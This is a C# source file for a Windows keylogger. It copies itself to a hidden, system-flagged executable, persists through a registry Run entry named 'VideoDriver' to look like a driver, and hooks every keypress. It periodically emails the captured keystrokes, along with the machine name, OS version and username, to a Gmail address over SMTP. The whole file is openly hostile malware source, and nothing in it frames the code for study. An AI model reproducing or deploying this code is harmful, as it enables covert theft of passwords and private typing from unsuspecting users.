using System;
using System.Text;
using System.IO;
using System.Windows.Forms;
using System.Net.Mail;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;
using System.Threading;

namespace abc
{
	class AppRun
	{
		string logged;
		string pathInstall = "D:\\key.exe"; // path to install
		string regName = "VideoDriver"; // registry name
		int logsize = 1;
		string logSize = "1";
		string mailto = "mailto@gmail.com";

		string mailfrom = "mailfrom@gmail.com";
		string mailfrompassword = "password";
		string SMTPAddress = "smtp.gmail.com";
		int SMTPPort = 587;

		Thread thr;
		SmtpClient smtp;
		MailMessage message;

		public AppRun()
		{
			Install();

			logged = "";
			logsize = int.Parse(logSize) * 512; // log will be sent when the file length is reached

			// start hook and set event
			UserActivityHook hook = new UserActivityHook(false, true);

			hook.KeyPress += Hook_KeyPress;

			thr = new Thread(ThreadRun);
			thr.IsBackground = true;
			thr.Start();
		}

		private void ThreadRun()
		{
			while (true)
			{
				if (logged.Length >= logsize)
				{
					Sendmail();
					logged = "";
				}
			}
		}

		private void Install()
		{
			if (Application.ExecutablePath.ToUpper() != pathInstall.ToUpper())
			{
				File.Copy(Application.ExecutablePath, pathInstall, true);
				File.SetAttributes(pathInstall, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);

				InstallReg();
				Process.Start(pathInstall);

				Application.Exit();
			}
			else
			{
				InstallReg();
			}
		}

		private void InstallReg()
		{
			RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
			if (rkApp.GetValue(regName) == null)
			{
				rkApp.SetValue(regName, pathInstall);
			}
		}

		public void Sendmail()
		{
			string computer = Environment.MachineName + " - " + Environment.OSVersion + " - " + Environment.UserName;

			message = new MailMessage(mailfrom, mailto, computer, logged);
			message.BodyEncoding = Encoding.UTF8;

			smtp = new SmtpClient(SMTPAddress, SMTPPort);
			smtp.UseDefaultCredentials = false;
			smtp.EnableSsl = true;
			smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
			smtp.Credentials = new NetworkCredential(mailfrom, mailfrompassword);
			smtp.Send(message);
		}

		private void Hook_KeyPress(object sender, KeyEventArgs e)
		{
			if (e.KeyCode != Keys.Back)
			{
				logged += (char)e.KeyValue;
			}
			else
				logged += "{Backspace}";
		}
	}
}
